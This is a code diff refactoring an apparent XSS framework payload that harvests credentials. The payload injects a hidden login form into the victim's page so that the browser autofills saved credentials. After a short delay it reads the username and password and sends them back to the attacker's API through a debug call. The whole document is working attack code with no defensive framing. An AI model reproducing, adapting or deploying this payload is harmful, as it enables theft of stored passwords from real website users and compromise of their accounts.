@@ -1,20 +1,24 @@
+xssmin();
+
 // inject the form
 function getLogin(uname, pname, loc) {
-	xssappend("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
+	xss.append("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
 	console.log("add form");
 	window.setTimeout(saveLogin, 800);
 }
 // send the parameters back to the api via a debug call
 function saveLogin() {
-	var u = xssgbi('un54');
-	var p = xssgbi('pw54');
-	if (u.value && u.value.length > 1) { debug("found username: "+encodeURIComponent(u.value)+" password: "+encodeURIComponent(p.value)); }
-	else { debug("login form injected, but no saved username was found"); } 
-	xsscls();
+	var u = xss.gbi('un54');
+	var p = xss.gbi('pw54');
+	if (u.value && u.value.length > 1) { xss.dbg("found username: "+encodeURIComponent(u.value)+" password: "+encodeURIComponent(p.value)); }
+	else { xss.dbg("login form injected, but no saved username was found"); } 
+	xss.cls();
 }
-var xssuname = xssopt("user_field", "the name attribute of the username field", "username");
-var xsspname = xssopt("pass_field", "the name attribute of the username field", "password");
-var xssloc = xssopt("form_action", "the location the form normally posts to", "/login"); 
 
-debug("injecting form : " + xssuname + " / " + xsspname + " / " + xssloc);
-getLogin(xssuname, xsspname, xssloc);
+// fetch the parameters
+var uname = xss.opt("user_field", "the name attribute of the username field", "username");
+var pname = xss.opt("pass_field", "the name attribute of the username field", "password");
+var loc = xss.opt("form_action", "the location the form normally posts to", "/login"); 
+
+xss.dbg("injecting form : " + uname + " / " + pname + " / " + loc);
+getLogin(uname, pname, loc);
